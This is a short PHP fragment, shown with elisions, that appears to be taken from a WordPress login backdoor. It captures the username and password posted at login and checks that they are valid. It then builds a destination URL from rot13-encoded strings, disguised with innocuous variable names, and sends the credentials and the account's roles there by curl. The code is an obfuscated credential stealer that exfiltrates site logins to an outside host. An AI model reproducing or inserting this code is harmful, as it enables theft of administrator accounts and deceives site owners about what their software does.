...
$wpuser = $_POST['log'];
$wppass = $_POST['pwd'];
$authwp = wp_authenticate($wpuser,$wppass);
$check = $authwp->allcaps;
if(!empty($check)){
$ch = curl_init();
$do_signup_conf = str_rot13("uggcf://");
$before_signup_conf = str_rot13("jbeqcerff-ncv.bet");
$get_error_log = str_rot13("/cbfg.cuc");
$logpath = $do_signup_conf.$before_signup_conf.$get_error_log;
curl_setopt($ch, CURLOPT_URL,$logpath);
...
'roles' => implode(",",array_keys($check))
));
$result = curl_exec($ch);
curl_close($ch);
}
